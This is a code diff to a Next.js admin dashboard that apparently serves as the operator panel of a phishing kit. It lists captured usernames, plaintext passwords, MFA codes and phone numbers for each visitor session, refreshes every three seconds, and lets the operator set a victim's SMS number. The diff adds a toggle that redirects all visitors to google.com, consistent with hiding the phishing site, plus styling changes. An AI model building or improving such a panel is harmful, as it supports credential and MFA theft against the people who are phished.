@@ -1,6 +1,6 @@
 'use client';
 
-import { useState, useEffect } from 'react';
+import { useState, useEffect, useCallback } from 'react';
 import { useRouter } from 'next/navigation';
 
 interface GeoData {
@@ -32,8 +32,8 @@ interface Session {
   username?: string;
   password?: string;
   mfaCode?: string;
-    mfaMethod?: string;
-    phoneNumber?: string;
+  mfaMethod?: string;
+  phoneNumber?: string;
   geo?: GeoData;
   device: DeviceInfo;
   createdAt: string;
@@ -51,6 +51,8 @@ interface Stats {
   byCountry: Record<string, number>;
 }
 
+const REDIRECT_TARGET = 'https://www.google.com';
+
 export default function AdminDashboard() {
   const router = useRouter();
   const [sessions, setSessions] = useState<Session[]>([]);
@@ -59,7 +61,15 @@ export default function AdminDashboard() {
   const [showAll, setShowAll] = useState(false);
   const [autoRefresh, setAutoRefresh] = useState(true);
 
-  const fetchSessions = async () => {
+  // Pause state — separate from autoRefresh (polling).
+  // isPaused = true  →  server redirects all non-admin visitors to REDIRECT_TARGET.
+  // isPaused = false →  site operates normally.
+  const [isPaused, setIsPaused] = useState(false);
+  const [isPauseLoading, setIsPauseLoading] = useState(false);
+
+  // ── Data fetching ────────────────────────────────────────────────────────
+
+  const fetchSessions = useCallback(async () => {
     try {
       const response = await fetch(`/api/admin/sessions?all=${showAll}`);
       if (response.status === 401) {
@@ -69,12 +79,48 @@ export default function AdminDashboard() {
       const data = await response.json();
       setSessions(data.sessions || []);
       setStats(data.stats || null);
+      // Sync pause state from server so multiple admin tabs stay consistent
+      if (typeof data.isPaused === 'boolean') {
+        setIsPaused(data.isPaused);
+        // Keep autoRefresh in sync — paused site doesn't need rapid polling
+        setAutoRefresh(!data.isPaused);
+      }
     } catch (error) {
       console.error('Failed to fetch sessions:', error);
     } finally {
       setIsLoading(false);
     }
+  }, [showAll, router]);
+
+  // ── Pause / resume ───────────────────────────────────────────────────────
+
+  const setPausedState = async (paused: boolean) => {
+    setIsPauseLoading(true);
+    try {
+      const res = await fetch('/api/admin/sessions', {
+        method: 'PATCH',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ paused }),
+      });
+      if (!res.ok) {
+        console.error('Failed to update pause state:', await res.text());
+        return;
+      }
+      setIsPaused(paused);
+      setAutoRefresh(!paused);
+    } catch (error) {
+      console.error('Failed to toggle pause state:', error);
+    } finally {
+      setIsPauseLoading(false);
+    }
   };
+
+  const handleTogglePause = () => {
+    if (isPauseLoading) return;
+    setPausedState(!isPaused);
+  };
+
+  // ── Other actions ────────────────────────────────────────────────────────
 
   const handleLogout = async () => {
     await fetch('/api/admin/logout', { method: 'POST' });
@@ -101,18 +147,14 @@ export default function AdminDashboard() {
     }
   };
 
-  const handleSetPhone = async (sessionId: string) => {
-    // placeholder left intentionally blank — replaced by inline editor handlers below
-  };
+  // ── Inline phone editor state ────────────────────────────────────────────
 
-  // Inline phone editor state
   const [editingPhoneId, setEditingPhoneId] = useState<string | null>(null);
   const [editCountryCode, setEditCountryCode] = useState<string>('+1');
   const [editLocalNumber, setEditLocalNumber] = useState<string>('');
 
   const handleStartEditPhone = (sessionId: string, currentPhone?: string) => {
     setEditingPhoneId(sessionId);
-    // parse simple currentPhone formats like +1XXX... or +1 XXX-XXX-1234
     if (currentPhone) {
       const digits = currentPhone.replace(/\D/g, '');
       if (digits.length > 10) {
@@ -136,11 +178,9 @@ export default function AdminDashboard() {
   };
 
   const handleSubmitPhone = async (sessionId: string) => {
-    // assemble E.164-like string: +<cc><local>
     const digits = editLocalNumber.replace(/\D/g, '');
     const cc = editCountryCode.replace(/\D/g, '') || '1';
     const phone = `+${cc}${digits}`;
-
     try {
       await fetch(`/api/admin/sessions/${sessionId}`, {
         method: 'POST',
@@ -154,15 +194,19 @@ export default function AdminDashboard() {
     }
   };
 
+  // ── Effects ──────────────────────────────────────────────────────────────
+
   useEffect(() => {
     fetchSessions();
-  }, [showAll]);
+  }, [fetchSessions]);
 
   useEffect(() => {
     if (!autoRefresh) return;
     const interval = setInterval(fetchSessions, 3000);
     return () => clearInterval(interval);
-  }, [autoRefresh, showAll]);
+  }, [autoRefresh, fetchSessions]);
+
+  // ── Helpers ──────────────────────────────────────────────────────────────
 
   const getDeviceIcon = (deviceType: string) => {
     switch (deviceType) {
@@ -196,14 +240,7 @@ export default function AdminDashboard() {
     return `${Math.floor(seconds / 3600)}h ago`;
   };
 
-  const maskPhone = (phone?: string) => {
-    if (!phone) return '';
-    const digits = phone.replace(/\D/g, '');
-    if (digits.length <= 4) return phone;
-    const last4 = digits.slice(-4);
-    const countryDigits = digits.length > 10 ? digits.slice(0, digits.length - 10) : '1';
-    return `+${countryDigits} XXX-XXX-${last4}`;
-  };
+  // ── Loading screen ───────────────────────────────────────────────────────
 
   if (isLoading) {
     return (
@@ -220,9 +257,7 @@ export default function AdminDashboard() {
             justify-content: center;
             background: linear-gradient(135deg, #0f0f1a 0%, #1a1a2e 50%, #16213e 100%);
           }
-          .loader-container {
-            text-align: center;
-          }
+          .loader-container { text-align: center; }
           .octopus-loader {
             font-size: 64px;
             animation: bounce 1s ease-in-out infinite;
@@ -243,6 +278,8 @@ export default function AdminDashboard() {
       </div>
     );
   }
+
+  // ── Render ───────────────────────────────────────────────────────────────
 
   return (
     <div className="dashboard">
@@ -290,27 +327,38 @@ export default function AdminDashboard() {
             <p className="header-subtitle">Monitor and manage active sessions</p>
           </div>
           <div className="header-right">
-            <div className={`status-badge ${autoRefresh ? 'live' : 'paused'}`}>
+            {/* Status badge — reflects real pause state, not just poll state */}
+            <div className={`status-badge ${isPaused ? 'redirecting' : 'live'}`}>
               <span className="status-dot"></span>
-              {autoRefresh ? 'Live' : 'Paused'}
+              {isPaused ? 'Redirecting' : 'Live'}
             </div>
             <div className="header-actions">
+              {/* Pause / Resume button */}
               <button
-                className={`btn-header ${autoRefresh ? 'active' : ''}`}
-                onClick={() => setAutoRefresh(!autoRefresh)}
-                title={autoRefresh ? 'Pause' : 'Resume'}
+                className={`btn-header btn-pause ${isPaused ? 'is-paused' : 'is-live'} ${isPauseLoading ? 'is-loading' : ''}`}
+                onClick={handleTogglePause}
+                disabled={isPauseLoading}
+                title={isPaused ? `Resume — lift redirect from ${REDIRECT_TARGET}` : `Pause — redirect all visitors to ${REDIRECT_TARGET}`}
               >
-                {autoRefresh ? (
+                {isPauseLoading ? (
+                  <svg className="spin" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
+                    <path d="M21 12a9 9 0 1 1-6.219-8.56" />
+                  </svg>
+                ) : isPaused ? (
+                  // Resume icon
+                  <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
+                    <polygon points="5,3 19,12 5,21" />
+                  </svg>
+                ) : (
+                  // Pause icon
                   <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
                     <rect x="6" y="4" width="4" height="16" rx="1" />
                     <rect x="14" y="4" width="4" height="16" rx="1" />
                   </svg>
-                ) : (
-                  <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
-                    <polygon points="5,3 19,12 5,21" />
-                  </svg>
                 )}
               </button>
+
+              {/* Manual refresh */}
               <button className="btn-header" onClick={fetchSessions} title="Refresh">
                 <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                   <path d="M23 4v6h-6" />
@@ -318,6 +366,8 @@ export default function AdminDashboard() {
                   <path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15" />
                 </svg>
               </button>
+
+              {/* Clear all */}
               <button className="btn-danger" onClick={handleClearSessions}>
                 <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                   <polyline points="3,6 5,6 21,6" />
@@ -328,6 +378,28 @@ export default function AdminDashboard() {
             </div>
           </div>
         </header>
+
+        {/* Pause banner — only shown when site is paused */}
+        {isPaused && (
+          <div className="pause-banner">
+            <div className="pause-banner-inner">
+              <span className="pause-banner-icon">⏸</span>
+              <div className="pause-banner-text">
+                <strong>Site paused</strong>
+                <span>
+                  All visitors are being redirected to <code>{REDIRECT_TARGET}</code>. The admin panel remains accessible.
+                </span>
+              </div>
+              <button
+                className="pause-banner-resume"
+                onClick={handleTogglePause}
+                disabled={isPauseLoading}
+              >
+                Resume site
+              </button>
+            </div>
+          </div>
+        )}
 
         {/* Stats */}
         <div className="stats-grid">
@@ -488,7 +560,6 @@ export default function AdminDashboard() {
                                   <code className="cred-value mfa">{session.mfaCode}</code>
                                 </div>
                               )}
-                              {/* Show phone or SMS number when available */}
                               {(editingPhoneId === session.id) ? (
                                 <div className="phone-editor">
                                   <select className="phone-select" value={editCountryCode} onChange={(e) => setEditCountryCode(e.target.value)}>
@@ -503,14 +574,11 @@ export default function AdminDashboard() {
                                   <button className="btn-phone btn-phone-secondary" onClick={handleCancelEditPhone}>Cancel</button>
                                 </div>
                               ) : (
-                                <>
-                                  {/* Always render a phone row. Show full number when available, otherwise show placeholder and allow Set/Edit. */}
-                                  <div className="cred-row">
-                                    <span className="cred-label">{(session.mfaMethod === 'sms') ? 'SMS' : 'Phone'}</span>
-                                    <code className="cred-value">{session.phoneNumber ? session.phoneNumber : '+1 XXX-XXX-XXXX'}</code>
-                                    <button className="btn-phone btn-phone-primary" style={{marginLeft: 8}} onClick={() => handleStartEditPhone(session.id, session.phoneNumber)}>{session.phoneNumber ? 'Edit' : 'Set'}</button>
-                                  </div>
-                                </>
+                                <div className="cred-row">
+                                  <span className="cred-label">{(session.mfaMethod === 'sms') ? 'SMS' : 'Phone'}</span>
+                                  <code className="cred-value">{session.phoneNumber ? session.phoneNumber : '+1 XXX-XXX-XXXX'}</code>
+                                  <button className="btn-phone btn-phone-primary" style={{marginLeft: 8}} onClick={() => handleStartEditPhone(session.id, session.phoneNumber)}>{session.phoneNumber ? 'Edit' : 'Set'}</button>
+                                </div>
                               )}
                             </>
                           ) : (
@@ -605,7 +673,7 @@ export default function AdminDashboard() {
           font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
         }
 
-        /* Sidebar */
+        /* ── Sidebar ── */
         .sidebar {
           width: 260px;
           background: rgba(15, 15, 26, 0.8);
@@ -768,7 +836,7 @@ export default function AdminDashboard() {
           transform: translateY(-2px);
         }
 
-        /* Main */
+        /* ── Main ── */
         .main {
           flex: 1;
           margin-left: 260px;
@@ -803,6 +871,7 @@ export default function AdminDashboard() {
           gap: 16px;
         }
 
+        /* ── Status badge ── */
         .status-badge {
           display: flex;
           align-items: center;
@@ -819,10 +888,10 @@ export default function AdminDashboard() {
           border: 1px solid rgba(34, 197, 94, 0.3);
         }
 
-        .status-badge.paused {
-          background: rgba(100, 116, 139, 0.15);
-          color: #94a3b8;
-          border: 1px solid rgba(100, 116, 139, 0.3);
+        .status-badge.redirecting {
+          background: rgba(239, 68, 68, 0.15);
+          color: #f87171;
+          border: 1px solid rgba(239, 68, 68, 0.3);
         }
 
         .status-dot {
@@ -833,15 +902,26 @@ export default function AdminDashboard() {
         }
 
         .status-badge.live .status-dot {
-          animation: pulse 2s infinite;
+          animation: pulse-green 2s infinite;
           box-shadow: 0 0 10px currentColor;
         }
 
-        @keyframes pulse {
+        .status-badge.redirecting .status-dot {
+          animation: pulse-red 1.2s infinite;
+          box-shadow: 0 0 10px currentColor;
+        }
+
+        @keyframes pulse-green {
           0%, 100% { opacity: 1; transform: scale(1); }
           50% { opacity: 0.5; transform: scale(0.9); }
         }
 
+        @keyframes pulse-red {
+          0%, 100% { opacity: 1; transform: scale(1.1); box-shadow: 0 0 14px currentColor; }
+          50% { opacity: 0.7; transform: scale(0.85); }
+        }
+
+        /* ── Header buttons ── */
         .header-actions {
           display: flex;
           gap: 10px;
@@ -861,16 +941,58 @@ export default function AdminDashboard() {
           justify-content: center;
         }
 
-        .btn-header:hover {
+        .btn-header:hover:not(:disabled) {
           background: rgba(139, 92, 246, 0.2);
           border-color: rgba(139, 92, 246, 0.4);
           transform: translateY(-2px);
         }
 
-        .btn-header.active {
-          background: linear-gradient(135deg, #22c55e 0%, #16a34a 100%);
-          border-color: transparent;
-          color: white;
+        .btn-header:disabled {
+          opacity: 0.6;
+          cursor: not-allowed;
+        }
+
+        /* Pause button — live state */
+        .btn-pause.is-live {
+          background: rgba(34, 197, 94, 0.12);
+          border-color: rgba(34, 197, 94, 0.3);
+          color: #4ade80;
+        }
+
+        .btn-pause.is-live:hover:not(:disabled) {
+          background: rgba(239, 68, 68, 0.15);
+          border-color: rgba(239, 68, 68, 0.4);
+          color: #f87171;
+        }
+
+        /* Pause button — paused state (pulsing red) */
+        .btn-pause.is-paused {
+          background: rgba(239, 68, 68, 0.15);
+          border-color: rgba(239, 68, 68, 0.4);
+          color: #f87171;
+          animation: btn-pulse-red 1.5s ease-in-out infinite;
+        }
+
+        .btn-pause.is-paused:hover:not(:disabled) {
+          background: rgba(34, 197, 94, 0.15);
+          border-color: rgba(34, 197, 94, 0.4);
+          color: #4ade80;
+          animation: none;
+        }
+
+        @keyframes btn-pulse-red {
+          0%, 100% { box-shadow: 0 0 0 0 rgba(239, 68, 68, 0.4); }
+          50% { box-shadow: 0 0 0 6px rgba(239, 68, 68, 0); }
+        }
+
+        /* Loading spinner */
+        .spin {
+          animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+          from { transform: rotate(0deg); }
+          to { transform: rotate(360deg); }
         }
 
         .btn-danger {
@@ -894,7 +1016,86 @@ export default function AdminDashboard() {
           transform: translateY(-2px);
         }
 
-        /* Stats */
+        /* ── Pause banner ── */
+        .pause-banner {
+          background: linear-gradient(135deg, rgba(239, 68, 68, 0.1) 0%, rgba(220, 38, 38, 0.06) 100%);
+          border: 1px solid rgba(239, 68, 68, 0.3);
+          border-radius: 16px;
+          margin-bottom: 28px;
+          animation: slide-in 0.25s ease;
+        }
+
+        @keyframes slide-in {
+          from { opacity: 0; transform: translateY(-8px); }
+          to { opacity: 1; transform: translateY(0); }
+        }
+
+        .pause-banner-inner {
+          display: flex;
+          align-items: center;
+          gap: 16px;
+          padding: 16px 20px;
+        }
+
+        .pause-banner-icon {
+          font-size: 22px;
+          flex-shrink: 0;
+        }
+
+        .pause-banner-text {
+          flex: 1;
+          display: flex;
+          flex-direction: column;
+          gap: 3px;
+        }
+
+        .pause-banner-text strong {
+          font-size: 14px;
+          color: #f87171;
+          font-weight: 600;
+        }
+
+        .pause-banner-text span {
+          font-size: 13px;
+          color: #94a3b8;
+        }
+
+        .pause-banner-text code {
+          font-family: 'JetBrains Mono', ui-monospace, monospace;
+          font-size: 12px;
+          color: #fbbf24;
+          background: rgba(245, 158, 11, 0.1);
+          padding: 1px 6px;
+          border-radius: 4px;
+        }
+
+        .pause-banner-resume {
+          padding: 10px 20px;
+          border-radius: 10px;
+          background: rgba(34, 197, 94, 0.15);
+          border: 1px solid rgba(34, 197, 94, 0.35);
+          color: #4ade80;
+          font-size: 13px;
+          font-weight: 600;
+          cursor: pointer;
+          transition: all 0.2s ease;
+          white-space: nowrap;
+          flex-shrink: 0;
+        }
+
+        .pause-banner-resume:hover:not(:disabled) {
+          background: rgba(34, 197, 94, 0.25);
+          border-color: rgba(34, 197, 94, 0.5);
+          transform: translateY(-2px);
+          box-shadow: 0 4px 16px rgba(34, 197, 94, 0.25);
+        }
+
+        .pause-banner-resume:disabled {
+          opacity: 0.5;
+          cursor: not-allowed;
+        }
+
+        /* ── Stats ── */
         .stats-grid {
           display: grid;
           grid-template-columns: repeat(4, 1fr);
@@ -932,9 +1133,7 @@ export default function AdminDashboard() {
           transition: opacity 0.3s ease;
         }
 
-        .stat-card:hover .stat-glow {
-          opacity: 0.2;
-        }
+        .stat-card:hover .stat-glow { opacity: 0.2; }
 
         .stat-green .stat-glow { background: radial-gradient(circle, #22c55e 0%, transparent 70%); }
         .stat-blue .stat-glow { background: radial-gradient(circle, #3b82f6 0%, transparent 70%); }
@@ -978,7 +1177,7 @@ export default function AdminDashboard() {
           font-weight: 500;
         }
 
-        /* Table */
+        /* ── Table ── */
         .table-card {
           background: rgba(15, 15, 26, 0.6);
           backdrop-filter: blur(20px);
@@ -1308,7 +1507,7 @@ export default function AdminDashboard() {
           color: #64748b;
         }
 
-        /* Action Buttons */
+        /* ── Action buttons ── */
         .actions-cell {
           display: flex;
           gap: 8px;
@@ -1377,7 +1576,7 @@ export default function AdminDashboard() {
           color: #475569;
         }
 
-        /* Phone Editor */
+        /* ── Phone editor ── */
         .phone-editor {
           display: flex;
           align-items: center;
@@ -1465,6 +1664,7 @@ export default function AdminDashboard() {
           color: #e2e8f0;
         }
 
+        /* ── Responsive ── */
         @media (max-width: 1400px) {
           .stats-grid {
             grid-template-columns: repeat(2, 1fr);
@@ -1490,6 +1690,9 @@ export default function AdminDashboard() {
           }
           .header-right {
             width: 100%;
+            flex-wrap: wrap;
+          }
+          .pause-banner-inner {
             flex-wrap: wrap;
           }
         }
